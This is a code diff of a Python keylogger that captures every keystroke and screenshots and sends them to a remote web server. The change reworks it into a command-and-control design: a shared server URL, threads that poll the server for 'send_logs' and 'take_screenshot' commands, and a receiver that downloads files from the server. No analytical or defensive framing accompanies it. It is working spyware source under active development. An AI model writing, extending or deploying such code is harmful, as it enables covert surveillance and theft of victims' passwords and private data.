@@ -5,9 +5,7 @@ import time
 from PIL import ImageGrab
 import io
 #----------------------------------------------------------------------
-#multithreading
-#rdm_sec = [500,600,700,800,900]
-# This function runs every time a key is pressed
+BASE_URL = "web server here"
 def on_press(key):
     try:
         # Try to get the printable character
@@ -25,8 +23,6 @@ def event_listener():
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 #----------------------------------------------------------------------
-#send content of file function
-url1 = "web server here"
 def send():
     while True:
         with open("keylog.txt", "r") as file:
@@ -35,19 +31,30 @@ def send():
             time.sleep(5)
             continue
         # data = "hello world test!"
-        requests.post(url1, json={"log": content})
+        requests.post(f"{BASE_URL}/page", json={"log": content})
         with open("keylog.txt", "r+") as con:
             con.seek(0)
             con.truncate()
         time.sleep(100)
-#comment
-#    time.sleep(300)
-url2= "web upload/ "
+
+
+def ss_command1():
+    try:
+        res = requests.get(f"{BASE_URL}/page")
+        time.sleep(50)
+        data = res.json()
+        if data.get("send_logs"):
+            send()
+    except Exception as c:
+        print("Error receiving command:", c)
+        time.sleep(100)
+
 #----------------------------------------------------------------------
 def receiver(): #short polling
     while True:
         try:
-            r = requests.get(url2)
+            r = requests.get(f"{BASE_URL}/page")
+            time.sleep(50)
             if r.status_code == 200:
                 # filename from server header or fallback
                 filename = r.headers.get("Content-Disposition", "").split("filename=")[-1].strip('"') \
@@ -62,7 +69,6 @@ def receiver(): #short polling
             print(f"[Receiver] Error: {e}")
             time.sleep(100)
 #________________________________________________________
-url3 = "web server here"
 def screenshot():
     # Capture screenshot
     ss = ImageGrab.grab()
@@ -70,13 +76,24 @@ def screenshot():
     ss.save(buffer, format="PNG")
     buffer.seek(0)
     # send to your own webserver
-    requests.post(url3, files={"file": (f"{int(time.time())}.png", buffer)})
-    time.sleep(300)
+    requests.post(f"{BASE_URL}/page", files={"file": (f"{int(time.time())}.png", buffer)})
+
+def ss_command2():
+    try:
+        res = requests.get(f"{BASE_URL}/page")
+        time.sleep(50)
+        data = res.json()
+        if data.get("take_screenshot"):
+            screenshot()
+    except Exception as e:
+        print("Error receiving command:", e)
+        time.sleep(100)
 #________________________________________________________
+
 thread1 = threading.Thread(target=event_listener, daemon=True)
-thread2 = threading.Thread(target=send, daemon=True)
-thread3 = threading.Thread(target=receiver, daemon=True)
-thread4 = threading.Thread(target=screenshot, daemon=True)
+thread2 = threading.Thread(target=receiver, daemon=True)
+thread3 = threading.Thread(target=ss_command1, daemon=True)
+thread4 = threading.Thread(target=ss_command2, daemon=True)
     # Start the threads
 thread1.start()
 thread2.start()
